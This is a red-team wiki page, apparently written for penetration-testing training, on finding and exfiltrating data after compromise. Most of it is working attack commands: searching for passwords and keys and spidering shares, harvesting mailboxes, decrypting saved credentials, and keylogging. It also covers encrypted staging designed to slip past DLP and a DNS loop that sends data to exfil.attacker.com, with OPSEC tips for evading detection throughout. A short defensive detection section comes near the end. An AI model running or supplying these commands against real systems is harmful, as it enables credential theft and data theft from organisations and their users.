---
title: Data hunting and exfiltration
slug: data-hunting-and-exfiltration
aliases: [data-exfil, post-exploitation-data, data-collection]
---

> **TL;DR:** After gaining access, the objective is often specific data — credentials, PII, intellectual property, emails. Data hunting means knowing where high-value data lives and how to find it quietly; exfiltration means getting it out through channels that blend with normal traffic.

## What it is
Data hunting is the post-exploitation phase where operators search compromised systems and networks for high-value information: documents, credentials, configuration files, emails, database dumps. Exfiltration is moving that data from the target environment to attacker-controlled infrastructure. Both require OPSEC discipline — mass file searches and large data transfers are high-visibility actions.

## Preconditions / where it applies
- Post-exploitation access on one or more hosts (local admin or user-level, depending on target data)
- Understanding of target's business to know what data matters (engagement scoping)
- C2 channel established (for exfil routing) or separate exfil infrastructure
- Relevant to every red-team engagement; CRTO exams include objective-based data collection

## Technique

### File hunting — local host

```cmd
:: Windows CMD — search for sensitive file types
dir /s /b C:\Users\*.doc* C:\Users\*.xls* C:\Users\*.pdf C:\Users\*.kdbx 2>nul
dir /s /b C:\Users\*.config C:\Users\*.xml C:\Users\*.txt 2>nul

:: Search file contents for keywords
findstr /si /m "password" C:\Users\*.txt C:\Users\*.xml C:\Users\*.config
findstr /si /m "secret\|api.key\|token\|connectionstring" C:\inetpub\*.config
```

```powershell
# PowerShell — more flexible patterns
Get-ChildItem -Path C:\Users -Recurse -Include *.kdbx,*.pfx,*.key,*.pem -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users -Recurse -Include *.docx,*.xlsx -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-30) }

# Search for files containing passwords
Select-String -Path C:\Users\*\Documents\*.txt -Pattern "password|secret|key" -CaseSensitive:$false
```

**High-value targets on disk:**
- `C:\Users\*\Documents\` — user documents, KeePass databases (`.kdbx`)
- `C:\Users\*\Desktop\` — frequently used files, password sticky notes
- `C:\Users\*\.ssh\` — SSH private keys
- `C:\Users\*\AppData\Local\Google\Chrome\User Data\` — browser saved passwords
- `C:\inetpub\wwwroot\web.config` — connection strings, API keys
- `C:\ProgramData\` — application configs with embedded credentials
- `%APPDATA%\Microsoft\Credentials\` — DPAPI-protected credential blobs
- `unattend.xml`, `sysprep.xml` — deployment files with plaintext passwords

### Network share enumeration

```powershell
# Enumerate accessible shares
Invoke-ShareFinder -CheckShareAccess  # PowerView
Find-InterestingFile -Path \\fileserver\share -Include *.kdbx,*.pfx,*password*

# CrackMapExec share spidering
# (from attacker machine through SOCKS proxy)
crackmapexec smb 10.10.10.0/24 -u user -p pass --shares
crackmapexec smb 10.10.10.5 -u user -p pass -M spider_plus
```

### SharePoint / OneDrive enumeration

```powershell
# SharePoint Online — search via Microsoft Graph API (requires token)
$headers = @{ Authorization = "Bearer $accessToken" }
$searchBody = @{ requests = @(@{ entityTypes = @("driveItem"); query = @{ queryString = "password OR secret OR confidential" }}) } | ConvertTo-Json -Depth 5
Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/search/query" -Method POST -Headers $headers -Body $searchBody -ContentType "application/json"

# On-prem SharePoint — use SweetPotato or SPScan to enumerate document libraries
```

### Email harvesting

**MailSniper** — search Exchange mailboxes:

```powershell
# Search current user's mailbox
Invoke-SelfSearch -Mailbox user@corp.com -Terms "password","vpn","credentials" -ExchHostname mail.corp.com
# Search all mailboxes (requires Exchange admin or impersonation rights)
Invoke-GlobalMailSearch -ImpersonationAccount admin@corp.com -Terms "password" -ExchHostname mail.corp.com
```

**Ruler** — interact with Exchange via MAPI/RPC or Outlook rules:

```bash
# Enumerate Outlook rules (persistence check)
ruler -u user@corp.com -p 'Password1' --email user@corp.com display
# Dump GAL (Global Address List)
ruler -u user@corp.com -p 'Password1' --email user@corp.com abk dump
```

### Credential harvesting from the host

```powershell
# Browser saved passwords (Chrome — DPAPI protected)
# Use SharpChromium or Seatbelt's ChromiumPresence command
.\Seatbelt.exe ChromiumPresence ChromiumBookmarks

# WiFi passwords
netsh wlan show profiles
netsh wlan show profile name="CorpWiFi" key=clear

# RDP saved credentials
cmdkey /list
# Then use SharpDPAPI to decrypt them
.\SharpDPAPI.exe credentials /target:C:\Users\admin\AppData\Local\Microsoft\Credentials\

# Windows Credential Manager
rundll32.exe keymgr.dll,KRShowKeyMgr  # GUI — only useful on interactive sessions
```

### Live collection — keylogging, screenshots, clipboard

From Cobalt Strike:

```text
keylogger <pid> <arch>    # inject keylogger into a process
screenshot <pid> <arch> 5 # take screenshots every 5 seconds
clipboard                 # grab current clipboard contents
```

From Meterpreter:

```text
keyscan_start
keyscan_dump
screenshot
```

OPSEC: keyloggers and screenshot jobs are fork-and-run (injected into a sacrificial process) — they create detectable process injection events. Target a long-lived, low-scrutiny process like `explorer.exe`.

### Data staging

Before exfiltration, compress and encrypt to reduce volume and avoid DLP:

```powershell
# Compress with 7zip (if available) — AES-256 encrypted archive
& 'C:\Program Files\7-Zip\7z.exe' a -tzip -p"ExfilPassword123" -mem=AES256 C:\Users\Public\backup.zip C:\staging\*

# PowerShell native compression
Compress-Archive -Path C:\staging\* -DestinationPath C:\Users\Public\data.zip

# Split large archives
& 'C:\Program Files\7-Zip\7z.exe' a -v50m C:\Users\Public\parts.zip C:\staging\*
```

**Stage to a single directory first** — don't exfil from scattered locations. Copy target files to a staging dir, compress, then exfil. Delete staging artifacts after.

### Exfiltration channels

**Over C2 (simplest but noisiest for large data):**

```text
# Cobalt Strike
download C:\Users\Public\data.zip
```

**DNS exfil (low bandwidth, hard to block):**

```bash
# Using dnscat2 or custom DNS TXT/CNAME exfil
# Encode data as subdomain labels (max 63 chars per label, 253 total)
for chunk in $(cat data.b64 | fold -w 60); do
    nslookup $chunk.exfil.attacker.com
done
```

**HTTPS to cloud storage (blends with legitimate traffic):**

```powershell
# Upload to Azure Blob Storage (looks like normal cloud traffic)
$headers = @{ "x-ms-blob-type" = "BlockBlob" }
Invoke-RestMethod -Uri "https://storageacct.blob.core.windows.net/container/data.zip?$sasToken" `
  -Method PUT -InFile C:\Users\Public\data.zip -Headers $headers

# Upload to AWS S3 presigned URL
Invoke-WebRequest -Uri $presignedUrl -Method PUT -InFile C:\Users\Public\data.zip
```

**OPSEC considerations for exfil:**
- Throttle transfer rate — large spikes trigger NetFlow/DLP alerts
- Use the same protocol as legitimate traffic (HTTPS to cloud if org uses cloud)
- Time exfil during business hours when traffic volume provides cover
- DNS exfil: keep queries per second low; high-frequency DNS to a single domain is trivially detected
- Never exfil to personal infrastructure registered in your name

## Detection and defence
- DLP solutions monitor for sensitive data patterns (SSN, credit card, file classification labels) leaving the network
- Unusual SMB share enumeration volume from a single source triggers lateral-movement detections
- `findstr` / `Select-String` bulk searches across network shares generate massive read events in file audit logs
- Large outbound transfers to cloud storage IPs from hosts that don't normally access them
- DNS exfil: abnormal query volume, high entropy in subdomain labels, long FQDN lengths
- Email: Exchange mailbox access audit logs (Event ID 1) show `Invoke-GlobalMailSearch` patterns
- Sysmon Event ID 1 with `7z.exe` or `rar.exe` command lines containing encryption flags
- Credential Manager access logged via Event ID 5379 (Windows Security log)

## References
- [MailSniper — Black Hills InfoSec](https://github.com/dafthack/MailSniper)
- [Ruler — SensePost](https://github.com/sensepost/ruler)
- [CrackMapExec spider_plus](https://github.com/byt3bl33d3r/CrackMapExec/wiki)
- [SharpDPAPI — GhostPack](https://github.com/GhostPack/SharpDPAPI)
- [MITRE ATT&CK — Exfiltration](https://attack.mitre.org/tactics/TA0010/)

See also: [[cobalt-strike-operations]], [[host-recon-tradecraft]], [[file-transfer-techniques]], [[dns-c2-and-icmp-c2]], [[opsec-fundamentals]], [[dpapi-credential-extraction]], [[kerberoasting]], [[lateral-movement-overview]]
